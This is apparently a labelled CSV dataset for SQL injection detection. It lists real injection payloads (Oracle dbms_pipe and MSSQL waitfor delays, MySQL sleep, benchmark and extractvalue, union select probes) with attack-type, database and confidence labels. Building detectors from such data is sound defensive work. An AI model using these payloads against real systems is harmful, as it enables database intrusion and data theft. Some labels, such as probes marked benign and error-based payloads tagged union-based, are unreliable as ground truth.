id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24916,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24920,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'cpoy' = 'cpoy",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24986,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24805,"iif ( 9875 = 8961,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24829,waitfor delay '0:0:5' and ( ( 'uvlf' = 'uvlf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24832,-6616 ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
24838,waitfor delay '0:0:5'#,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24867,"iif ( 1217 = 8831,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24875,"1, ( case when 5514 = 9602 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 49 chars.,2
24876,"1%"" ) ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24892,"iif ( 4836 = 1823,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24968,1' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24800,-8878' in boolean mode ) union all select 7785#,union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
24802,-2797' ) ) ) union all select 5711#,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
24806,"-7843' where 5986 = 5986 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
24807,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
24809,-7466 where 5161 = 5161 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
24811,"-4477' ) ) union all select 8444,8444,8444,8444,8444,8444,8444,8444--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
24815,"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
24816,"-8999"" where 2821 = 2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
24820,"1"" where 8672 = 8672 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
24824,-6912' in boolean mode ) union all select 6012--,union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
24825,"-6334' ) union all select 3738,3738,3738,3738,3738,3738,3738,3738--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
24827,"1"" ) as lipa where 3450 = 3450 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 67 chars.,2
24828,"1' ) where 6081 = 6081 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
24837,-7707' ) ) union all select 3172#,union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
24839,"-5082 ) ) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
24843,"-7796' ) union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
24844,"-7499%"" ) union all select 1893,1893,1893,1893,1893#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
24846,"1%"" ) and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
24849,1' in boolean mode ) and 7533 = 7533#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
24854,"-9953'|| ( select 'zljk' where 2886 = 2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",union_based,generic,0.7,UNION-based payload detected. Payload length: 110 chars.,2
24862,1 where 6494 = 6494 and 8463 = 2760,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 35 chars.,2
24864,"1"" and 7533 = 7533 and ""btak"" like ""btak",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
24868,-6540' ) where 5019 = 5019 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 53 chars.,2
24872,-8639 ) or 8138 = 6252,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
24882,"-7627%"" ) ) union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",union_based,generic,0.7,UNION-based payload detected. Payload length: 80 chars.,2
24884,"1 ) as lejp where 5238 = 5238 union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
24887,-6487 ) or 6872 = 6872 and ( 7688 = 7688,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
24888,-9054 ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
24890,1' ) where 6624 = 6624 and 5392 = 8258,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
24896,"-1413"" ) union all select 6651,6651,6651--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
24899,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
24903,"-4135' ) ) ) union all select 4413,4413,4413#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
24909,"1%"" ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
24910,"-2430' ) union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
24913,1 ) ) ) and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
24917,-2055 ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
24927,-9355' or 6872 = 6872 and 'mztk' = 'mztk,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
24932,"-5211"" ) ) as bkvr where 4082 = 4082 or 2323 = 8052",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
24933,"1 ) ) as oywa where 7951 = 7951 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
24934,"-2207%' ) ) union all select 3339,3339,3339,3339,3339,3339#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
24940,"1"" ) ) as fapw where 4722 = 4722 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
24943,"-1526"" ) where 4870 = 4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
24950,"1"" where 2394 = 2394 and 8831 = 8333--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
24963,"-2855"" ) ) ) union all select 1496,1496,1496,1496#",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
24964,"-8544%"" or 6872 = 6872 and ""%"" = """,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 34 chars.,2
24966,"-8703' ) where 9723 = 9723 union all select 9723,9723,9723,9723,9723#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
24970,-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--,union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
24971,-3107' ) where 7782 = 7782 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
24974,"-6263"" union all select 8005,8005#",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
24977,"-8793' where 3853 = 3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
24978,"1"" ) where 9962 = 9962 and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
24979,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
24980,1 ) as mtnw where 7293 = 7293 and 2603 = 5764--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,2
24981,"-9082 union all select 9858,9858,9858,9858,9858,9858--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
24984,"1%"" union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
24985,"-9587 union all select 1568,1568,1568,1568,1568,1568#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
24990,"1 ) ) as berd where 5803 = 5803 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
24995,"-4694' ) where 1501 = 1501 union all select 1501,1501,1501,1501,1501,1501#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
24817,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 3039 = 3039",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24818,"1"" ) ) ) rlike sleep ( 5 ) #",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
24819,"1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24830,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24833,"1"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""kzcd"" = ""kzcd",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24853,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'rpiz' like 'rpiz",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24870,"1%' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24871,"1 ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24877,"1"" ) where 4905 = 4905 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24878,"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- zvkh",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24885,"1"" ) ) as dpln where 4193 = 4193 rlike sleep ( 5 ) --",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
24886,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'vwtq' = 'vwtq",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24912,"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 7244 = 7244",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24928,"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""bkoq"" = ""bkoq",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24946,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'kufi' = 'kufi",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
24948,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24953,"1' in boolean mode ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24988,"1 ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7182 = 7182",time_blind,sqlite,1.0,"Signals: 'randomblob', 'hex'; Time-blind SQLi (sleep/delay function); DB: sqlite",1
24993,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'sqni' like 'sqni",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
24834,-4137 ) ) as elxu where 5672 = 5672 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 48 chars.,1
24863,"1' and elt ( 4249 = 4249,7259 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24883,"1"" ) where 9086 = 9086 or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24926,"-5840' ) or elt ( 1032 = 1032,3623 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24929,"1 ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,Signals: 'benchmark'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24967,"1"" or sleep ( 5 ) #",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24983,"-9884' ) or elt ( 1942 = 8409,8409 ) and ( 'tqdq' like 'tqdq",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
24991,"make_set ( 8734 = 8734,sleep ( 5 ) )",time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
24801,1' ) ) and ( 7517 = 3423 ) *3423 and ( ( 'aenz' = 'aenz,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 55 chars.,1
24804,1' ) and ( 3020 = 3020 ) *6703 and ( 'botl' like 'botl,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 54 chars.,1
24879,"-6198"" ) or make_set ( 3602 = 2178,2178 ) and ( ""xksq"" like ""xksq",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 65 chars.,1
24881,"end and ( ( ""cxoi"" = ""cxoi",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,1
24898,"1 ) and make_set ( 8403 = 8403,8899 )",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,1
24951,"-3090"" or make_set ( 9354 = 9354,7185 ) and ""qowe"" like ""qowe",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 61 chars.,1
24962,end and ( ( 2160 = 2160,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,1
24823,1 ) as itvm where 1482 = 1482,benign,generic,0.5,. Payload length: 29 chars.,1
24831,"1"" ) where 2367 = 2367",benign,generic,0.5,. Payload length: 22 chars.,1
24845,1' where 2958 = 2958,benign,generic,0.5,. Payload length: 20 chars.,1
24856,1' ) ) as fbjd where 8597 = 8597,benign,generic,0.5,. Payload length: 32 chars.,1
24857,1 ) ) as ipfy where 1189 = 1189,benign,generic,0.5,. Payload length: 31 chars.,1
24859,1' ) ) as tlsl where 8467 = 8467,benign,generic,0.5,. Payload length: 32 chars.,1
24900,"1"" ) ) as xbhp where 7527 = 7527",benign,generic,0.5,. Payload length: 32 chars.,1
24908,1 ) as ptxw where 9873 = 9873,benign,generic,0.5,. Payload length: 29 chars.,1
24915,"1"" ) where 9093 = 9093",benign,generic,0.5,. Payload length: 22 chars.,1
24931,1 where 2238 = 2238,benign,generic,0.5,. Payload length: 19 chars.,1
24939,"1"" ) ) as swwb where 4244 = 4244",benign,generic,0.5,. Payload length: 32 chars.,1
24952,"1"" ) ) as vgsb where 4747 = 4747",benign,generic,0.5,. Payload length: 32 chars.,1
24989,1 ) where 2930 = 2930,benign,generic,0.5,. Payload length: 21 chars.,1
24803,"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 2303 = 2303",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
24808,"1"" where 3221 = 3221 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24810,"1%"" ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""%"" = """,union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
24812,"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
